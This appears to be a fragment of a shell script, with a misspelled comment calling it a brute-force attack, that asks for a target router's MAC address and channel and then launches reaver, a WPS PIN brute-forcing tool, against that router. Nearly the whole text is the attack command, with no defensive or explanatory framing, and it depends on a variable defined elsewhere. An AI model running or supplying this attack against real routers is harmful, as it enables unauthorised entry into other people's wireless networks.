# reaver to run brut forve attach
echo "Enter target router mac address.";
read targetRouterMac
echo "Enter target router channel."
read targetRouterChannel

reaver --bssid $targetRouterMac --channel $targetRouterChannel --interface $myWifiDevice -vvv --no-associate